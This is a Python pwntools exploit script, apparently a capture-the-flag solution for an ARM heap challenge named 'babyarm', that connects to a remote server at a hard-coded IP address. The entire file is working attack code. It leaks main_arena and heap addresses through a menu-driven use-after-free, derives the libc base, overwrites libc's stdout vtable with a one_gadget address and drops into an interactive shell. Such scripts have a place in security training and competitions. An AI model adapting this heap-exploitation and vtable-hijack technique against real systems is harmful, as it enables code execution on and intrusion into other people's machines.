#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
from pwn import *
from time import sleep

__author__ = 'luckasdf0'

# Settings
context.terminal = ['tmux', 'splitw', '-h']
context.os = 'linux'
context.arch = 'arm'

# Global
EXEC = 0x0000555555554000
PROG = "./babyarm"
LIBC = "./libc.so.6"
elf = ELF(PROG)
libc = ELF(LIBC)
#io = process("./run.sh")
io = remote("51.15.131.72", 9999)
# gdb
def attach(addr):
    log.info('b *0x%x' % (addr))
    raw_input()

def add(idx, content):
    io.recvuntil('Your choice:')
    io.sendline('1')
    io.recvuntil('Index:')
    io.sendline(str(idx))
    io.recvuntil('Content:')
    io.send(content)

def show(idx):
    io.recvuntil('Your choice:')
    io.sendline('2')
    io.recvuntil('Index:')
    io.sendline(str(idx))

def dele(idx):
    io.recvuntil('Your choice:')
    io.sendline('3')
    io.recvuntil('Index:')
    io.sendline(str(idx))

def info():
    io.recvuntil('Your choice:')
    io.sendline('4')

io.recvuntil('Your name:')
io.send('A'*0x40)

add(0, '0'*0xff+'\n')
add(1, '1'*0xff+'\n')
add(2, '1'*0xff+'\n')
add(3, '1'*0xff+'\n')
dele(0)
dele(2)

#libc_base = 0xf66d9000

#attach(0x10902)
add(0, 'A')
sleep(0.2)
show(0)
io.recvuntil(": ")
main_arena = u32(io.recv(4))-0x41+0xcc
heap_base = u32(io.recv(3).ljust(0x4, '\x00'))-0x210
libc_base = main_arena-0xe87cc
log.info(hex(main_arena))
log.info(hex(heap_base))
log.info(hex(libc_base))

off_stdout_vtable = 0xe8df0
libc_stdout_vtable = libc_base+off_stdout_vtable
log.info(hex(libc_stdout_vtable))

#raw_input()

#one_gadget = libc_base+0x2C635
#one_gadget = libc_base+0x462F1
#one_gadget = libc_base+0x84CC3
one_gadget = libc_base+0x462f0+1
log.info(hex(one_gadget))

vtable  = ''
#vtable += p32(0xdeadbeef)*0x3f
vtable += p32(one_gadget)*0x3f
add((libc_stdout_vtable-0x2106C-0x100000000)/4, vtable+'\n')

io.interactive()
